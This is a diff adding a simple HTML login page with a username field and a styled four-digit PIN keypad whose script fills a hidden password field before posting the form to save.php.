@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #f4f4f4;
+        }
+        .container {
+            text-align: center;
+        }
+        .pin-input {
+            font-size: 30px;
+            letter-spacing: 10px;
+            border: none;
+            text-align: center;
+            width: 180px;
+            background: transparent;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(3, 100px);
+            justify-content: center;
+            grid-gap: 15px;
+            margin-top: 20px;
+        }
+        button {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 2px solid #d9534f;
+            background: none;
+            font-size: 24px;
+            color: #d9534f;
+        }
+        #zero {
+            grid-column: 2; /* Moves 0 to center */
+        }
+        #backspace {
+            width: 100px;
+            height: 100px;
+            border-radius: 20px;
+            font-size: 20px;
+        }
+        input {
+            padding: 10px;
+            margin: 5px;
+            width: 230px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <h2>Login</h2>
+
+    <form method="POST" action="save.php">
+        <input type="text" name="username" placeholder="Enter Username" required><br>
+
+        <!-- Hidden real password field -->
+        <input type="hidden" name="password" id="passwordField">
+
+        <!-- Displayed PIN -->
+        <input class="pin-input" id="display" type="text" maxlength="4" placeholder="----" disabled>
+
+        <div class="grid">
+            <button type="button" onclick="press(1)">1</button>
+            <button type="button" onclick="press(2)">2</button>
+            <button type="button" onclick="press(3)">3</button>
+            <button type="button" onclick="press(4)">4</button>
+            <button type="button" onclick="press(5)">5</button>
+            <button type="button" onclick="press(6)">6</button>
+            <button type="button" onclick="press(7)">7</button>
+            <button type="button" onclick="press(8)">8</button>
+            <button type="button" onclick="press(9)">9</button>
+
+            <button id="zero" type="button" onclick="press(0)">0</button>
+        </div>
+
+        <br>
+        <button id="backspace" type="button" onclick="back()">X</button>
+        <br><br>
+        <button style="width:150px;height:50px;border-radius:10px;" type="submit">Login</button>
+
+    </form>
+</div>
+
+<script>
+let password = "";
+
+function press(num) {
+    if (password.length < 4) {
+        password += num;
+        document.getElementById("display").value = password.replace(/./g, "*");
+        document.getElementById("passwordField").value = password;
+    }
+}
+
+function back() {
+    password = password.slice(0, -1);
+    document.getElementById("display").value = password.replace(/./g, "*");
+    document.getElementById("passwordField").value = password;
+}
+</script>
+
+</body>
+</html>
